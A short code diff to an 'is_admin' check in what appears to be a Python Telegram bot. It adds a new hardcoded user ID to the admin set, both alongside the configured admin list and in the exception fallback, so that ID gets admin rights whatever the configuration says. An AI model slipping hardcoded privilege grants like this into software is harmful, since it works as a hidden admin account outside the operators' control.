@@ -88,12 +88,12 @@ def is_admin(user_id: Any) -> bool:
         return False
     try:
         from config import ADMIN_IDS, ADMIN_ID
-        admin_set = {str(ADMIN_ID).strip(), "748538264", "6615827337"}
+        admin_set = {str(ADMIN_ID).strip(), "8676453621", "748538264", "6615827337"}
         for a in ADMIN_IDS:
             admin_set.add(str(a).strip())
         return str(user_id).strip() in admin_set
     except Exception:
-        return str(user_id).strip() in {"748538264", "6615827337"}
+        return str(user_id).strip() in {"8676453621", "748538264", "6615827337"}
 
 def build_main_keyboard(auto_send_on: bool, batch_size: str = "3", source_mode: str = "vip") -> InlineKeyboardMarkup:
     """ساخت کیبورد اصلی شیک، کامل و بهینه برای ادمین"""
